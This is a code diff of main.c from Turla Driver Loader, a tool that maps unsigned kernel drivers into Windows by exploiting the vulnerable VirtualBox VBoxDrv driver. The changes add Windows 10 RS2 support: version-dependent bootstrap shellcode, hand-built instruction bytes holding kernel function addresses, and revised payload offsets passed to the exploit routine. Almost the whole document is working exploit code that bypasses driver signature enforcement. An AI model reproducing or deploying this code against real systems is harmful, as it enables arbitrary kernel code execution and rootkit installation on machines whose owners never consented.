@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     1.10
+*  VERSION:     1.11
 *
-*  DATE:        17 Apr 2017
+*  DATE:        20 Apr 2017
 *
 *  Furutaka entry point.
 *
@@ -34,17 +34,18 @@ BOOL       g_ConsoleOutput = FALSE;
 BOOL       g_VBoxInstalled = FALSE;
 WCHAR      g_BE = 0xFEFF;
 
+ULONG      g_NtBuildNumber = 0;
+
 #define VBoxDrvSvc      TEXT("VBoxDrv")
 #define supImageName    "furutaka"
 #define supImageHandle  0x1a000
 #define PAGE_SIZE       0x1000
-#define scDataOffset    0x214 //shellcode data offset
 
-#define T_LOADERTITLE   TEXT("Turla Driver Loader v1.1 (17/04/17)")
+#define T_LOADERTITLE   TEXT("Turla Driver Loader v1.1.1 (20/04/17)")
 #define T_LOADERUNSUP   TEXT("Unsupported WinNT version\r\n")
 #define T_LOADERRUN     TEXT("Another instance running, close it before\r\n")
 #define T_LOADERUSAGE   TEXT("Usage: loader drivertoload\n\re.g. loader mydrv.sys\r\n")
-#define T_LOADERINTRO   TEXT("Turla Driver Loader v1.1.0 started\r\n(c) 2016 - 2017 TDL Project\r\nSupported x64 OS : 7 and above\r\n")
+#define T_LOADERINTRO   TEXT("Turla Driver Loader v1.1.1 started\r\n(c) 2016 - 2017 TDL Project\r\nSupported x64 OS : 7 and above\r\n")
 
 /*
 * TDLVBoxInstalled
@@ -83,8 +84,8 @@ BOOL TDLVBoxInstalled(
 *
 */
 void TDLRelocImage(
-    ULONG_PTR Image,
-    ULONG_PTR NewImageBase
+    _In_ ULONG_PTR Image,
+    _In_ ULONG_PTR NewImageBase
 )
 {
     PIMAGE_OPTIONAL_HEADER   popth;
@@ -139,9 +140,9 @@ void TDLRelocImage(
 *
 */
 ULONG_PTR TDLGetProcAddress(
-    ULONG_PTR KernelBase,
-    ULONG_PTR KernelImage,
-    LPCSTR FunctionName
+    _In_ ULONG_PTR KernelBase,
+    _In_ ULONG_PTR KernelImage,
+    _In_ LPCSTR FunctionName
 )
 {
     ANSI_STRING    cStr;
@@ -163,9 +164,9 @@ ULONG_PTR TDLGetProcAddress(
 *
 */
 void TDLResolveKernelImport(
-    ULONG_PTR Image,
-    ULONG_PTR KernelImage,
-    ULONG_PTR KernelBase
+    _In_ ULONG_PTR Image,
+    _In_ ULONG_PTR KernelImage,
+    _In_ ULONG_PTR KernelBase
 )
 {
     PIMAGE_OPTIONAL_HEADER      popth;
@@ -211,8 +212,9 @@ void TDLResolveKernelImport(
 *
 */
 void TDLExploit(
-    LPVOID Shellcode,
-    ULONG CodeSize
+    _In_ LPVOID Shellcode,
+    _In_ ULONG CodeSize,
+    _In_ ULONG DataOffset
 )
 {
     SUPCOOKIE       Cookie;
@@ -307,7 +309,7 @@ void TDLExploit(
             ultohex(CodeSize, _strend(text));
 
             _strcat(text, TEXT("\r\n\tDriver image mapped at 0x"));
-            u64tohex((ULONG_PTR)ImageBase + scDataOffset, _strend(text));
+            u64tohex((ULONG_PTR)ImageBase + DataOffset, _strend(text));
             cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
         }
 
@@ -376,13 +378,14 @@ void TDLExploit(
 *
 */
 UINT TDLMapDriver(
-    LPWSTR lpDriverFullName
+    _In_ LPWSTR lpDriverFullName
 )
 {
     UINT               result = (UINT)-1;
-    ULONG              isz;
+    ULONG              isz, prologueSize, dataOffset;
     SIZE_T             memIO;
-    ULONG_PTR          KernelBase, KernelImage = 0, xExAllocatePoolWithTag = 0, xPsCreateSystemThread = 0;
+    ULONG_PTR          KernelBase, KernelImage = 0;
+    ULONG_PTR          xExAllocatePoolWithTag = 0, xPsCreateSystemThread = 0, xZwClose = 0;
     HMODULE            Image = NULL;
     PIMAGE_NT_HEADERS  FileHeader;
     PBYTE              Buffer = NULL;
@@ -443,16 +446,30 @@ UINT TDLMapDriver(
             cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
         }
 
-        RtlInitString(&routineName, "PsCreateSystemThread");
-        status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID)&xPsCreateSystemThread);
-        if ((!NT_SUCCESS(status)) || (xPsCreateSystemThread == 0)) {
-            cuiPrintText(g_ConOut, TEXT("Ldr: Error, PsCreateSystemThread address not found"), g_ConsoleOutput, TRUE);
-            break;
-        }
-        else {
-            _strcpy(text, TEXT("Ldr: PsCreateSystemThread 0x"));
-            u64tohex(KernelBase + (xPsCreateSystemThread - KernelImage), _strend(text));
-            cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
+        if (g_NtBuildNumber < 15063) {
+            RtlInitString(&routineName, "PsCreateSystemThread");
+            status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID)&xPsCreateSystemThread);
+            if ((!NT_SUCCESS(status)) || (xPsCreateSystemThread == 0)) {
+                cuiPrintText(g_ConOut, TEXT("Ldr: Error, PsCreateSystemThread address not found"), g_ConsoleOutput, TRUE);
+                break;
+            }
+            else {
+                _strcpy(text, TEXT("Ldr: PsCreateSystemThread 0x"));
+                u64tohex(KernelBase + (xPsCreateSystemThread - KernelImage), _strend(text));
+                cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
+            }
+
+            RtlInitString(&routineName, "ZwClose");
+            status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID)&xZwClose);
+            if ((!NT_SUCCESS(status)) || (xZwClose == 0)) {
+                cuiPrintText(g_ConOut, TEXT("Ldr: Error, ZwClose address not found"), g_ConsoleOutput, TRUE);
+                break;
+            }
+            else {
+                _strcpy(text, TEXT("Ldr: ZwClose 0x"));
+                u64tohex(KernelBase + (xZwClose - KernelImage), _strend(text));
+                cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
+            }
         }
 
         memIO = isz + PAGE_SIZE;
@@ -470,25 +487,49 @@ UINT TDLMapDriver(
 
         // mov rcx, ExAllocatePoolWithTag
         // mov rdx, PsCreateSystemThread
+        // mov r8, ZwClose
 
         Buffer[0x00] = 0x48; // mov rcx, xxxxx
         Buffer[0x01] = 0xb9;
         *((PULONG_PTR)&Buffer[2]) =
             KernelBase + (xExAllocatePoolWithTag - KernelImage);
-        Buffer[0x0a] = 0x48; // mov rdx, xxxxx
-        Buffer[0x0b] = 0xba;
-        *((PULONG_PTR)&Buffer[0x0c]) =
-            KernelBase + (xPsCreateSystemThread - KernelImage);
 
-        RtlCopyMemory(Buffer + 0x14,
-            TDLBootstrapLoader_code, sizeof(TDLBootstrapLoader_code));
-        RtlCopyMemory(Buffer + scDataOffset, Image, isz);
+        if (g_NtBuildNumber < 15063) {
+            Buffer[0x0a] = 0x48; // mov rdx, xxxxx
+            Buffer[0x0b] = 0xba;
+            *((PULONG_PTR)&Buffer[0x0c]) =
+                KernelBase + (xPsCreateSystemThread - KernelImage);
+            Buffer[0x14] = 0x49; //mov r8, xxxxx
+            Buffer[0x15] = 0xb8;
+            *((PULONG_PTR)&Buffer[0x16]) =
+                KernelBase + (xZwClose - KernelImage);
+
+            prologueSize = 0x1e;
+        }
+        else {
+            prologueSize = 0x0a;
+        }
+
+        dataOffset = prologueSize + MAX_SHELLCODE_LENGTH;
+
+        if (g_NtBuildNumber < 15063) {
+            RtlCopyMemory(Buffer + prologueSize,
+                TDLBootstrapLoader_code, sizeof(TDLBootstrapLoader_code));
+            cuiPrintText(g_ConOut, TEXT("Ldr: Default bootstrap shellcode selected"), g_ConsoleOutput, TRUE);
+        }
+        else {
+            RtlCopyMemory(Buffer + prologueSize,
+                TDLBootstrapLoader_code_w10rs2, sizeof(TDLBootstrapLoader_code_w10rs2));
+            cuiPrintText(g_ConOut, TEXT("Ldr: Windows 10 RS2+ bootstrap shellcode selected"), g_ConsoleOutput, TRUE);
+        }
+
+        RtlCopyMemory(Buffer + dataOffset, Image, isz);
 
         cuiPrintText(g_ConOut, TEXT("Ldr: Resolving kernel import"), g_ConsoleOutput, TRUE);
-        TDLResolveKernelImport((ULONG_PTR)Buffer + scDataOffset, KernelImage, KernelBase);
+        TDLResolveKernelImport((ULONG_PTR)Buffer + dataOffset, KernelImage, KernelBase);
 
         cuiPrintText(g_ConOut, TEXT("Ldr: Executing exploit"), g_ConsoleOutput, TRUE);
-        TDLExploit(Buffer, isz + PAGE_SIZE);
+        TDLExploit(Buffer, isz + PAGE_SIZE, dataOffset);
         result = 0;
         break;
     }
@@ -575,14 +616,15 @@ HANDLE TDLStartVulnerableDriver(
             }
         }
 
-        //if vbox installed backup it driver, do it before dropping our
+        //
+        // If vbox installed backup it driver, do it before dropping our
+        // Ignore error if file not found
+        //
         if (g_VBoxInstalled) {
             if (supBackupVBoxDrv(FALSE) == FALSE) {
                 cuiPrintText(g_ConOut,
                     TEXT("Ldr: Error while doing VirtualBox driver backup"),
                     g_ConsoleOutput, TRUE);
-
-                break;
             }
         }
 
@@ -717,7 +759,7 @@ void TDLStopVulnerableDriver(
 *
 */
 UINT TDLProcessCommandLine(
-    LPWSTR lpCommandLine
+    _In_ LPWSTR lpCommandLine
 )
 {
     UINT   retVal = (UINT)-1;
@@ -765,7 +807,7 @@ void TDLMain()
     UINT            uResult = 0;
     DWORD           dwTemp;
     LONG            x;
-    OSVERSIONINFOW  osv;
+    OSVERSIONINFO   osv;
     WCHAR           text[256];
 
     __security_init_cookie();
@@ -795,7 +837,6 @@ void TDLMain()
             T_LOADERINTRO,
             g_ConsoleOutput, TRUE);
 
-
         x = InterlockedIncrement((PLONG)&g_lApplicationInstances);
         if (x > 1) {
             cuiPrintText(g_ConOut,
@@ -817,6 +858,8 @@ void TDLMain()
             break;
         }
 
+        g_NtBuildNumber = osv.dwBuildNumber;
+
         _strcpy(text, TEXT("Ldr: Windows v"));
         ultostr(osv.dwMajorVersion, _strend(text));
         _strcat(text, TEXT("."));
@@ -825,6 +868,10 @@ void TDLMain()
         ultostr(osv.dwBuildNumber, _strend(text));
         cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
 
+        //
+        // If VirtualBox installed on the same machine warn user,
+        // however this is unnecessary can lead to any conflicts.
+        //
         g_VBoxInstalled = TDLVBoxInstalled();
         if (g_VBoxInstalled) {
             cuiPrintText(g_ConOut,
